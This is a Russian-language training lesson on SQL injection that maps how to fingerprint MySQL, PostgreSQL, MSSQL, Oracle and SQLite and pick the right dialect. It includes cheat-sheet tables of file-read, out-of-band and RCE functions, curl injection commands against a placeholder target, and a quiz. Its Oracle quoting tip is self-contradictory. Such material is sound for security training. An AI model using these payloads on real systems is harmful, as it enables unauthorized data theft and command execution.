---
id: web-sqli-dbms
title: "Атака на СУБД: карта диалектов и переход к разбору каждой базы"
category: web
parent: web-sqli
difficulty: easy
order: 2
tags: [sqli, database, dbms, mysql, postgresql, mssql, oracle, sqlite, dialect, fingerprint]
prerequisites: [web-sqli]
useful_for:
  - "CTF Web категория"
  - "Bug bounty"
  - "Пентест веб-приложений"
estimated_minutes: 30
summary: "Как определить СУБД по отклику и выбрать правильный диалект атаки: сводная карта синтаксиса и навигация к детальному разбору MySQL, PostgreSQL, MSSQL, Oracle и SQLite."
---

Один и тот же «SQL-инъекционный» класс на практике распадается на пять совершенно разных миров. `SLEEP(5)` в MySQL — это `pg_sleep(5)` в PostgreSQL, `WAITFOR DELAY` в MSSQL, `dbms_pipe.receive_message` в Oracle и вообще отсутствие задержек в SQLite. `GROUP_CONCAT` есть только в MySQL, `string_agg` — в PostgreSQL и MSSQL, `LISTAGG` — в Oracle. RCE достижим через `xp_cmdshell` (MSSQL), `COPY ... TO PROGRAM` (PostgreSQL), `lib_mysqludf_sys` (MySQL), `dbms_java` (Oracle) — и почти невозможен в SQLite. Этот урок — карта: как понять, с какой базой вы говорите, и куда идти за деталями. Пять следующих уроков — полные практические разборы каждой СУБД.

## Зачем отдельный урок под каждую СУБД

Большинство «туториалов по SQLi» написаны под MySQL и молча ломаются на всём остальном. На реальном тесте вы не выбираете базу — вы её обнаруживаете. Разница критична, потому что от неё зависит:

- **какая техника сработает** (blind по времени есть везде, но функции разные);
- **какие данные можно достать** (`information_schema` есть не везде одинаково; в Oracle это `all_tables`, в SQLite — `sqlite_master`);
- **дойдёте ли вы до RCE** (MSSQL/PostgreSQL — да, SQLite — почти нет);
- **как обходить WAF** (комментарии, конкатенация, ключевые слова — всё разное).

Практическое правило: **сначала фингерпринт, потом диалект**. Не пишите payload «в общем виде» — определите базу и переходите к её уроку.

## Фингерпринт: как понять, какая это база

Первый шаг — намеренно сломать запрос и прочитать текст ошибки. Синтаксические ошибки у каждой СУБД уникальны.

| Признак в ответе / поведении | Вероятная СУБД |
|------------------------------|----------------|
| `You have an error in your SQL syntax` | MySQL / MariaDB |
| `syntax error at or near "..."` / `ERROR: unterminated quoted string` | PostgreSQL |
| `Unclosed quotation mark after the character string` / `Microsoft OLE DB Provider for SQL Server` / `Incorrect syntax near` | MSSQL |
| `ORA-00933: SQL command not properly ended` / `ORA-01756` | Oracle |
| `SQLite3::SQLException` / `near "..." : syntax error` / `no such table` | SQLite |
| `Unknown column '...' in 'where clause'` | MySQL |
| `column "..." does not exist` | PostgreSQL |
| `Invalid column name '...'` | MSSQL |
| `no such column: ...` | SQLite |

Дальше уточняем версию через функцию версии — но она тоже у каждой своя:

| СУБД | Запрос версии |
|------|---------------|
| MySQL | `SELECT @@version`, `SELECT version()` |
| PostgreSQL | `SELECT version()`, `SHOW server_version` |
| MSSQL | `SELECT @@version`, `SELECT SERVERPROPERTY('ProductVersion')` |
| Oracle | `SELECT banner FROM v$version`, `SELECT version FROM v$instance` |
| SQLite | `SELECT sqlite_version()` |

## Сводная таблица диалектов

Держите её перед глазами при ручной инъекции. Это самый полезный «шпаргалочный» блок урока.

| Возможность | MySQL | PostgreSQL | MSSQL | Oracle | SQLite |
|-------------|-------|------------|-------|--------|--------|
| Комментарий строки | `-- ` , `#`, `/* */` | `-- `, `/* */` | `-- `, `/* */` | `-- `, `/* */` | `-- `, `/* */` |
| Конкатенация | `CONCAT(a,b)`, `a b` | `a || b`, `CONCAT` | `a + b`, `CONCAT` | `a || b`, `CONCAT` | `a || b` |
| Агрегация строк | `GROUP_CONCAT(x)` | `string_agg(x,',')` | `STRING_AGG(x,',')` | `LISTAGG(x,',')` | `GROUP_CONCAT(x)` |
| Текущая БД | `database()`, `schema()` | `current_database()` | `DB_NAME()` | `SYS_CONTEXT('USERENV','DB_NAME')` | `sqlite_master` (файл) |
| Пользователь | `user()`, `current_user()` | `current_user` | `SUSER_SNAME()`, `USER_NAME()` | `USER` | нет ролей |
| Пауза | `SLEEP(5)` | `pg_sleep(5)` | `WAITFOR DELAY '0:0:5'` | `dbms_pipe.receive_message('a',5)` | нет |
| Ограничение строк | `LIMIT 1 OFFSET 0` | `LIMIT 1 OFFSET 0` | `TOP 1`, `OFFSET` | `ROWNUM`, `FETCH FIRST` | `LIMIT 1 OFFSET 0` |
| Stacked (`;`) | зависит от драйвера | да (libpq) | да | нет (PL/SQL) | обычно нет |
| Чтение файла | `LOAD_FILE('/etc/passwd')` | `pg_read_file()` | `OPENROWSET(BULK ...)` | `UTL_FILE` | нет |
| Запись файла | `INTO OUTFILE` | `COPY ... TO` | `OLE Automation`, `BCP` | `UTL_FILE` | `ATTACH DATABASE` |
| RCE | UDF `lib_mysqludf_sys` | `COPY ... FROM PROGRAM` | `xp_cmdshell` | Java stored procs | `load_extension` |

## Каналы утечки: что работает в каждой базе

| Канал | MySQL | PostgreSQL | MSSQL | Oracle | SQLite |
|-------|:-----:|:----------:|:-----:|:------:|:------:|
| UNION (in-band) | да | да | да | да | да |
| Error-based | да (`extractvalue`) | да (`CAST`) | да (`CONVERT`) | да (`CTXSYS.DRITHSX`) | редко |
| Boolean-blind | да | да | да | да | да |
| Time-blind | `SLEEP` | `pg_sleep` | `WAITFOR` | `dbms_pipe` | нет |
| OOB DNS/HTTP | `LOAD_FILE` (Windows UNC) | `COPY`, `dblink` | `xp_dirtree` | `UTL_HTTP`/`UTL_INADDR` | нет |

Ключевой вывод: **blind по времени есть у четырёх из пяти** — поэтому его и стоит осваивать первым. SQLite-инъекции обычно эксплуатируют через UNION или boolean, потому что задержек там нет.

## Универсальный алгоритм: с чего начинать на любой БД

Порядок действий, который не зависит от диалекта (детали — в уроках по базам):

```bash
# 1. Разорвать кавычку и прочитать ошибку -> определить СУБД
curl -s "https://target/item?id=1'" | grep -iE "syntax|ORA-|SQL Server|SQLite|PostgreSQL"

# 2. Число колонок через ORDER BY (работает почти везде)
for n in 1 2 3 4 5; do
  echo -n "$n: "
  curl -s "https://target/item?id=1 ORDER BY $n-- -" | wc -c
done

# 3. Проверить boolean-различие (норма vs ложь)
curl -s "https://target/item?id=1 AND 1=1-- -" | wc -c   # как обычный
curl -s "https://target/item?id=1 AND 1=2-- -" | wc -c   # отличается -> инъекция

# 4. Проверить time-blind своей для базы функцией (5 сек)
curl -s -o /dev/null -w '%{time_total}\n' "https://target/item?id=1; SELECT SLEEP(5)-- -"   # MySQL
curl -s -o /dev/null -w '%{time_total}\n' "https://target/item?id=1; SELECT pg_sleep(5)-- -" # PostgreSQL

# 5. UNION и вывод колонок
curl -s "https://target/item?id=-1 UNION SELECT 1,2,3-- -"
```

Как только СУБД определена — открывайте соответствующий урок ниже и работайте по нему. Не смешивайте синтаксис: `SLEEP` в PostgreSQL даст ошибку функции, `pg_sleep` в MySQL — тоже.

## Переход к разборам: пять баз

| Урок | База | Ключевые фишки | RCE |
|------|------|----------------|:---:|
| [`db-mysql`](db-mysql) | MySQL / MariaDB | `GROUP_CONCAT`, `INTO OUTFILE`, UDF, `general_log` | да |
| [`db-postgresql`](db-postgresql) | PostgreSQL | `string_agg`, `COPY TO/FROM PROGRAM`, `pg_read_file` | да |
| [`db-mssql`](db-mssql) | Microsoft SQL Server | `xp_cmdshell`, `OPENROWSET`, linked servers | да |
| [`db-oracle`](db-oracle) | Oracle | `all_tables`, `UTL_HTTP`, PL/SQL, Java procs | через Java |
| [`db-sqlite`](db-sqlite) | SQLite | `sqlite_master`, `ATTACH DATABASE`, mobile apps | `load_extension` |

Начинайте с той базы, которую показал фингерпринт. Если не удалось определить — работайте по MySQL-диалекту (самый частый в вебе), но помните про `information_schema`, который есть у большинства.

## Типичные ошибки при смене СУБД

- **Слепо использовать MySQL-синтаксис.** `--` без пробела не работает в MySQL, `#` не работает в PostgreSQL/MSSQL/Oracle.
- **Забывать про регистр в Oracle.** Некавычечные идентификаторы в Oracle — ВЕРХНИЙ регистр: `all_tables` вернёт строки, а `ALL_TABLES` в кавычках — нет.
- **Ждать stacked-запросов везде.** В Oracle и часто в SQLite они невозможны; планируйте UNION/blind.
- **Путать `information_schema` и системные каталоги.** В Oracle нет `information_schema` в привычном виде — там `all_tables`, `all_tab_columns`.
- **Искать time-based там, где его нет.** В SQLite `SLEEP` не существует; переходите на UNION/boolean.
- **Забывать про `--secure-file-priv`.** В MySQL файловые функции и `INTO OUTFILE` могут быть заблокированы настройкой.

## Квиз

Выберите один вариант в каждом вопросе.

```quiz
- question: "Ошибка «You have an error in your SQL syntax» указывает на какую СУБД?"
  options:
    - "PostgreSQL"
    - "MySQL"
    - "MSSQL"
    - "Oracle"
  answer: 1
  explanation: "Это классический текст ошибки MySQL/MariaDB."
- question: "Какая функция агрегирует строки в одну строку в MySQL?"
  options:
    - "string_agg"
    - "LISTAGG"
    - "GROUP_CONCAT"
    - "STRING_AGG"
  answer: 2
  explanation: "GROUP_CONCAT — MySQL. string_agg — PostgreSQL, LISTAGG — Oracle."
- question: "Как организовать задержку (time-based blind) в MSSQL?"
  options:
    - "SLEEP(5)"
    - "pg_sleep(5)"
    - "WAITFOR DELAY '0:0:5'"
    - "dbms_pipe.receive_message('a',5)"
  answer: 2
  explanation: "В MSSQL пауза делается через WAITFOR DELAY."
- question: "В какой СУБД RCE достигается через COPY ... FROM PROGRAM?"
  options:
    - "SQLite"
    - "PostgreSQL"
    - "Oracle"
    - "MySQL"
  answer: 1
  explanation: "COPY TO/FROM PROGRAM — серверная фича PostgreSQL, доступная суперпользователю."
- question: "Где хранится список таблиц в SQLite?"
  options:
    - "information_schema.tables"
    - "all_tables"
    - "sys.objects"
    - "sqlite_master"
  answer: 3
  explanation: "В SQLite метаданные лежат в sqlite_master (и sqlite_schema)."
```

## Где пригодится

- **CTF (Web):** задачи с разными СУБД — частая тема; умение определить диалект экономит десятки минут.
- **Bug bounty:** реальные приложения используют MySQL, PostgreSQL, MSSQL, Oracle; payload под правильную базу = подтверждённый high/critical.
- **Пентест:** отчёт требует точной идентификации СУБД и рабочего PoC под неё.
- **Работа (AppSec):** ревью кода и конфигураций под конкретный движок; понимание, где возможен RCE через базу.
